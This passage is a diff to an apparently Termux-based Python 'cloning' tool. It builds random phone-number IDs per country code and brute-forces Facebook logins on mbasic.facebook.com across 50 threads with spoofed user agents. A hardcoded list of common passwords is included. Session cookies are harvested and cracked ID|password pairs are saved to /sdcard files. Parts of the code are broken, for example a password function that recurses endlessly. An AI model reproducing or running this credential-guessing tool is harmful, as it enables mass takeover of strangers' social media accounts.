+		os.system('clear')
+		print(logo)
+		print(logo21)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def china():
+	print(logo22)
+	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.1355,1555,1855,")
+	try:
+		code = input(" \x1b[1;97mchoose code  : ")
+		k="+86"
+		os.system('clear')
+		print(logo)
+		print(logo22)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def denmark():
+	print(logo23)
+	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.2,3,4,5,6,7,8")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+45"
+		os.system('clear')
+		print(logo)
+		print(logo23)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def france():
+	print(logo24)
+	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.65,70,73,74,76,77")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+33"
+		os.system('clear')
+		print(logo)
+		print(logo24)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def germany():
+	print(logo25)
+	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.151,152,153,155,157,159,160,162,179,163,174,163")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+49"
+		os.system('clear')
+		print(logo)
+		print(logo25)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def malaysia():
+	print(logo26)
+	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.11,12,13,14,15,16,17,18,19")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+60"
+		os.system('clear')
+		print(logo)
+		print(logo26)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def sri():
+	print(logo27)
+	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.71,72,73,74,75,76,77,78")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+94"
+		os.system('clear')
+		print(logo)
+		print(logo27)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def turkey():
+	print(logo28)
+	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.55,54,53,52,50")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+90"
+		os.system('clear')
+		print(logo)
+		print(logo28)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def uae():
+	print(logo29)
+	print("\x1b[1;97m(leave the first tree digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,55,58,54,56")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+971"
+		os.system('clear')
+		print(logo)
+		print(logo29)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def saudi():
+	print (logo30)
+	print("\x1b[1;97m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here.50,51,52,53,54,55,56,57,58,")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+966"
+		os.system('clear')
+		print(logo)
+		print(logo30)
+		main()
+	except IOError:
+		print ("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def israel():
+	print(logo31)
+	print("\x1b[1;97m(leave the first three digits and the last seven digits of any phone number in this country.Write the remaining digits here. 52,55")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+972"
+		os.system('clear')
+		print(logo)
+		print(logo31)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def iran():
+	print(logo32)
+	print("\x1b[1;97m(leave the first two digits and the last seven digits of any phone number in this country.Write the remaining digits here.990,915,901,933,938,902")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+98"
+		os.system('clear')
+		print(logo)
+		print(logo32)
+		main()
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+
+def main():
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	print(logo7)
+	print("\x1b[1;97m0175,0165,0191, 0192, 0193, 0194, 0195, 017,019,013,014,016,170,180,190,150,015,130,140,018,0196, 0197, 0198, 0199")
+	try:
+		code = input('\n   \033[0;92mCHOOSE CODE >>>\033[1;37m ')
+		k="+880"
+		os.system('clear')
+		print(logo53)
+		os.system('clear')
+		print(logo7)
+	except IOError:
+		print("[!] File Not Found")
+		input("\n[ Back ]")
+		Rdx1x()
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = "passbd()"
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		clear()
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		for pww in user:
+			pwx = "pww"
+			uid = code+random.choice(ugen)
+			for pro in RdxID:
+				pwx.append(pro)
+				pwx.append(pww)
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+
+
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
+	try:
+		for ps in pwx:
+			pro = random.choice(pww)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
+    "method": 'GET',
+    "scheme": 'https',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'referer': 'https://mbasic.facebook.com/?stype=lo&jlou=AfenWrDJrg6bli4boZ0PkVBdHonIEbBOk-nUPN_lXmQACJRdEMH0WKUgR5wjxf2v3HVgphCTlJh0qLL4qII9KsXB1yNQu8nowexJyi_4mqpJkg&smuh=36411&lh=Ac-CgbcnzaD0nRh-mHA&wtsid=rdr_0adeBNCcgVOy0KeJ5&refid=8&ref_component=mbasic_footer&_rdr',
+    'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
+    'sec-ch-ua-mobile': '?1',
+    'sec-ch-ua-platform': '"Android"',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'same-origin',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1',
+    'user-agent': pro}
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/RDX/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				#print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/RDX/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+		sys.stdout.flush()
+	except:
+		pass
+	
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+
+		
 def tokenz():
 	os.system('clear')
 	print(logo)
@@ -11018,29 +11263,172 @@ def tokenz():
 		print("\033[0;92m[!] Wrong")
 		e = input('\n   \033[0;92m[?] \033[0;92mWant to pick up token? >>>\033[0;92m[y/n]: \033[1;37m ')
 		if e =="":
-			keluar()
+			exit()
 		elif e =="y":
 			login()
 		else:
-			keluar()
+			exit()
 
+def passbd():
+	if pww == "RT@oAwy5t":
+		RdxID.append(pww)
+	elif pww == "RE9iKR=GG":
+		RdxID.append(pww)
+	elif pww == "zr%Xd665a":
+		RdxID.append(pww)
+	elif pww == "joybangla":
+		RdxID.append(pww)
+	elif pww == "octopus":
+		RdxID.append(pww)
+	elif pww == "i love you":
+		RdxID.append(pww)
+	elif pww == "iloveyou":
+		RdxID.append(pww)
+	elif pww == "Iloveyou":
+		RdxID.append(pww)
+	elif pww == "I Love You":
+		RdxID.append(pww)
+	elif pww == "passwordnai":
+		RdxID.append(pww)
+	elif pww == "janinah":
+		RdxID.append(pww)
+	elif pww == "bongobondhu":
+		RdxID.append(pww)
+	elif pww == "tuipagol":
+		RdxID.append(pww)
+	elif pww == "tumishuduamr":
+		RdxID.append(pww)
+	elif pww == "monvalonei":
+		RdxID.append(pww)
+	elif pww == "bangladesh":
+		RdxID.append(pww)
+	elif pww == "shonarbangla":
+		RdxID.append(pww)
+	elif pww == "valotheko":
+		RdxID.append(pww)
+	elif pww == "mymensing":
+		RdxID.append(pww)
+	elif pww == "gazipur":
+		RdxID.append(pww)
+	elif pww == "australia":
+		RdxID.append(pww)
+	elif pww == "amarjan":
+		RdxID.append(pww)
+	elif pww == "january":
+		RdxID.append(pww)
+	elif pww == "boshonto":
+		RdxID.append(pww)
+	elif pww == "shunabondhu":
+		RdxID.append(pww)
+	elif pww == "akashnil":
+		RdxID.append(pww)
+	elif pww == "abujuber":
+		RdxID.append(pww)
+	elif pww == "siamhosen":
+		RdxID.append(pww)
+	elif pww == "rajonmia":
+		RdxID.append(pww)
+	elif pww == "rokunmia":
+		RdxID.append(pww)
+	elif pww == "khan123":
+		RdxID.append(pww)
+	elif pww == "pubgmobile":
+		RdxID.append(pww)
+	elif pww == "Pubgmobile":
+		RdxID.append(pww)
+	elif pww == "Pubg123":
+		RdxID.append(pww)
+	elif pww == "pubg123":
+		RdxID.append(pww)
+	elif pww == "pubg1234":
+		RdxID.append(pww)
+	elif pww == "Pubg1234":
+		RdxID.append(pww)
+	elif pww == "freefirel123":
+		RdxID.append(pww)
+	elif pww == "Freefire123":
+		RdxID.append(pww)
+	elif pww == "freefire":
+		RdxID.append(pww)
+	elif pww == "Freefire":
+		RdxID.append(pww)
+	elif pww == "Password":
+		RdxID.append(pww)
+	elif pww == "monster":
+		RdxID.append(pww)
+	elif pww == "playboy":
+		RdxID.append(pww)
+	elif pww == "please":
+		RdxID.append(pww)
+	elif pww == "babukhaiso":
+		RdxID.append(pww)
+	elif pww == "aimontumakedilam":
+		RdxID.append(pww)
+	elif pww == "paglahawa":
+		RdxID.append(pww)
+	elif pww == "sunnyleane":
+		RdxID.append(pww)
+	elif pww == "chottogram":
+		RdxID.append(pww)
+	elif pww == "iskonbangladesh":
+		RdxID.append(pww)
+	elif pww == "aminastik":
+		RdxID.append(pww)
+	elif pww == "shudhutumi":
+		RdxID.append(pww)
+	elif pww == "bolbona":
+		RdxID.append(pww)
+	elif pww == "janina":
+		RdxID.append(pww)
+	elif pww == "kisuina":
+		RdxID.append(pww)
+	elif pww == "kisuinah":
+		RdxID.append(pww)
+	elif pww == "shundori":
+		RdxID.append(pww)
+	elif pww == "baburma":
+		RdxID.append(pww)
+	elif pww == "amirtumi":
+		RdxID.append(pww)
+	elif pww == "rajarani":
+		RdxID.append(pww)
+	elif pww == "passwordki":
+		RdxID.append(pww)
+	elif pww == "mafkor":
+		RdxID.append(pww)
+	elif pww == "1234567":
+		RdxID.append(pww)
+	elif pww == "1234987":
+		RdxID.append(pww)
+	elif pww == "angel123":
+		RdxID.append(pww)
+	elif pww == "joy4567":
+		RdxID.append(pww)
+	elif pww == "Bangladesh":
+		RdxID.append(pww)
+	elif pww == "password":
+		RdxID.append(pww)
+	elif pww == "1234567890":
+		RdxID.append(pww)
+	else:
+		passbd()
 
 
 try:
-    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
-    v = 5.2
-    update = ('5.2')
-    update = ('5.2')
-    if str(v) in update:
-        os.system('clear')
-    else:pass
+	print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
+	v = 5.2
+	update = ('5.2')
+	update = ('5.2')
+	if str(v) in update:
+		os.system('clear')
+	else:pass
 except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
 #global functions
 def dynamic(text):
-    titik = ['.   ','..  ','... ','.... ']
-    for o in titik:
-        print('\r'+text+o),
-        sys.stdout.flush();time.sleep(1)
+	titik = ['.   ','..  ','... ','.... ']
+	for o in titik:
+		print('\r'+text+o),
+		sys.stdout.flush();time.sleep(1)
 
 
 #User agents
@@ -11048,94 +11436,94 @@ ugen2=[]
 ugen=[]
  
 for xd in range(10000):
-    aa='Mozilla/5.0 (Linux; U; Android'
-    b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
-    c=' en-us; GT-'
-    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    e=random.randrange(1, 999)
-    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
-    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
-    h=random.randrange(73,100)
-    i='0'
-    j=random.randrange(4200,4900)
-    k=random.randrange(40,150)
-    l='Mobile Safari/537.36'
-    uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
-    ugen.append(uaku2)
+	aa='Mozilla/5.0 (Linux; U; Android'
+	b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
+	c=' en-us; GT-'
+	d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	e=random.randrange(1, 999)
+	f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
+	g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
+	h=random.randrange(73,100)
+	i='0'
+	j=random.randrange(4200,4900)
+	k=random.randrange(40,150)
+	l='Mobile Safari/537.36'
+	uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
+	ugen.append(uaku2)
     
 # APK CHECK
 def Rdx2x():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
-    print(" ══════════════════════════════════════════")
-    rk1 = '0171'
-    rk2 = '0172'
-    rk3 = '0175'
-    rk4 = '017'
-    code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
-    os.system('clear')
-    print(logo)
-    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    os.system("clear")
-    print(logo)
-    passx = 0
-    HamiiID = []
-    print("")
-    for bilal in range(passx):
-        pww = input(f"[*] Enter Password {bilal+1} : ")
-        HamiiID.append(pww)
-    with ThreadPool(max_workers=50) as manshera:
-        clear()
-        tl = str(len(user))
-        jalan('\033[1;97m====================================================')
-        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
-        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
-        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
-        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
-        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
-        jalan('\033[1;97m====================================================')
-        for love in user:
-            pwx = [love[1:]]
-            uid = code+love
-            for Eman in HamiiID:
-                pwx.append(Eman)
-                pwx.append(love)
-            manshera.submit(rcrack,uid,pwx,tl)
-    print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
-    print('\x1b[1;94mCrack process has been completed')
-    print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
-    print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	user=[]
+	twf =[]
+	os.getuid
+	os.geteuid
+	os.system("clear")
+	print(logo)
+	print(f' [{xr}^{x}] Example>: {xr}019,017,018,92302,92301,91778{x}')
+	print(" ══════════════════════════════════════════")
+	rk1 = '0171'
+	rk2 = '0172'
+	rk3 = '0175'
+	rk4 = '017'
+	code = random.choice([rk1,rk2,rk3])                      # input(f' [{xr}■{x}] Choose : ')
+	os.system('clear')
+	print(logo)
+	limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
+	for nmbr in range(limit):
+		nmp = ''.join(random.choice(string.digits) for _ in range(7))
+		user.append(nmp)
+	os.system("clear")
+	print(logo)
+	passx = 0
+	RdxID = []
+	print("")
+	for bilal in range(passx):
+		pww = input(f"[*] Enter Password {bilal+1} : ")
+		RdxID.append(pww)
+	with ThreadPool(max_workers=50) as manshera:
+		clear()
+		tl = str(len(user))
+		jalan('\033[1;97m====================================================')
+		jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
+		jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
+		jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
+		jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
+		jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
+		jalan('\033[1;97m====================================================')
+		for noob in user:
+			pwx = [noob[1:]]
+			uid = code+noob
+			for pro in RdxID:
+				pwx.append(pro)
+				pwx.append(noob)
+			manshera.submit(rcrackx,uid,pwx,tl)
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
+	print('\x1b[1;94mCrack process has been completed')
+	print('\x1b[1;94mIDs saved in \033[0;92mok.txt,\x1b[1;91mcp.txt')
+	print('\x1b[1;92m•••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••••')
 
-def rcrack(uid,pwx,tl):
-    #print(user)
-    global loop
-    global cps
-    global oks
-    global proxy
-    try:
-        for ps in pwx:
-            pro = random.choice(ugen)
-            session = requests.Session()
-            free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
-            log_data = {
-                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
-            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
-            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
-            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
-            "try_number":"0",
-            "unrecognized_tries":"0",
-            "email":uid,
-            "pass":ps,
-            "login":"Log In"}
-            header_freefb = {"authority": 'mbasic.facebook.com',
+def rcrackx(uid,pwx,tl):
+	#print(user)
+	global loop
+	global cps
+	global oks
+	global proxy
+	try:
+		for ps in pwx:
+			pro = random.choice(ugen)
+			session = requests.Session()
+			free_fb = session.get('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
+			log_data = {
+				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
+			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+			"m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+			"li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
+			"try_number":"0",
+			"unrecognized_tries":"0",
+			"email":uid,
+			"pass":ps,
+			"login":"Log In"}
+			header_freefb = {"authority": 'mbasic.facebook.com',
     "method": 'GET',
     "scheme": 'https',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
@@ -11150,107 +11538,107 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
     'user-agent': pro}
-            lo = session.post('https://mbasic.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
-            log_cookies=session.cookies.get_dict().keys()
-            if 'c_user' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[7:22]
-                print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
-                cek_apk(session,coki)
-                open('/sdcard/ⓇDX-OK.txt', 'a').write( uid+' | '+ps+'\n')
-                oks.append(cid)
-                break
-            elif 'checkpoint' in log_cookies:
-                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
-                cid = coki[24:39]
-                #print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
-                open('/sdcard/ⓇDX-CP.txt', 'a').write( uid+' | '+ps+' \n')
-                cps.append(cid)
-                break
-            else:
-                continue
-        loop+=1
-        sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
-        sys.stdout.flush()
-    except:
-        pass
+			lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
+			log_cookies=session.cookies.get_dict().keys()
+			if 'c_user' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[7:22]
+				print('\r\r\033[1;32m[ⓇDX-OK💚] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[‎‎Ⓡ]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
+				cek_apk(session,coki)
+				open('/sdcard/RDX/ⓇDX-OK-1.txt', 'a').write( uid+' | '+ps+'\n')
+				oks.append(cid)
+				break
+			elif 'checkpoint' in log_cookies:
+				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
+				cid = coki[24:39]
+				print('\r\r\33[1;30m[ⓇDX-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
+				open('/sdcard/RDX/ⓇDX-CP-1.txt', 'a').write( uid+' | '+ps+' \n')
+				cps.append(cid)
+				break
+			else:
+				continue
+		loop+=1
+		sys.stdout.write(f'\r\r%s{x}[{xr}ⓇDX{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
+		sys.stdout.flush()
+	except:
+		pass
 
 
 # APK CHECK
 def Rdx3x():
-    user=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    jalan("     \33[37;41m\t  USE OUR COUNTRY CODE  \33[0;m")
-    print('')
-    jalan('\x1b[1;94m  PAK  CODES  :  \x1b[1;94m92301, \x1b[1;94m92302 ,\x1b[1;94m92303 ,\x1b[1;94m92305  ...\033[0;97m')
-    jalan('\x1b[1;97m ══════════════════════════════════════════════════════════')
-    jalan('\x1b[1;91m  INDIA CODES :  \x1b[1;91m91778, \x1b[1;91m91930 ,\x1b[1;91m91902 ,\x1b[1;91m91712  ...\033[0;97m')
-    jalan('\x1b[1;97m ══════════════════════════════════════════════════════════')
-    jalan('\x1b[1;92m  BD CODES    :  \x1b[1;92m88016, \x1b[1;92m88017 ,\x1b[1;92m88018 ,\x1b[1;92m88019  ...\033[0;97m')
-    jalan('\x1b[1;97m ══════════════════════════════════════════════════════════\n')
-    code = input(' PUT CODE : ')
-    os.system('clear')
-    print(logo)
-    limit = int(input(f'\033[0;97m[{xr}^{x}]\033[0;92m EXAMPLE : \033[0;93m500,\x1b[38;5;208m1000,\033[0;92m2000,\033[0;93m3000,\x1b[38;5;208m5000,\033[0;92m10000,\033[0;93m20000,\x1b[38;5;208m30000,\033[0;92m50000,\033[0;93m100000,\x1b[38;5;208m1000000 ] \n\033[0;95m══════════════════════════════════════════════════════════════════════════════════ \n\033[0;97m[{xr}^{x}] \033[0;92mPUT CLONING LIMIT:\033[0;93m '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        user.append(nmp)
-    os.system("clear")
-    print(logo)
-    passx = 0
-    HamiiID = []
-    print("")
-    for bilal in range(passx):
-        pww = input(f"[*] Enter Password {bilal+1} : ")
-        HamiiID.append(pww)
-    with ThreadPool(max_workers=50) as manshera:
-        clear()
-        tl = str(len(user))
-        jalan('\033[1;97m====================================================')
-        jalan(f'[{xr}^{x}]\x1b[38;5;208m YOUR TOTAL IDS: {xr}'+tl)
-        jalan(f'{x}[{xr}^{x}]\033[0;92m PLEASE WAIT YOUR CLONING PROCESS HAS BEEN STARTED')
-        jalan(f'\033[0;97m[{xr}^{x}]\033[0;93m USE YOUR MOBILE DATA ')
-        jalan(f'\033[0;97m[{xr}^{x}] \x1b[38;5;208mUse Flight Mode For Speed Up')
-        jalan(f'\033[0;97m[{xr}^{x}] \033[0;95mSuper Fast Speed Cloning')
-        jalan('\033[1;97m====================================================')
-        for love in user:
-            pwx = [love[1:]]
-            uid = code+love
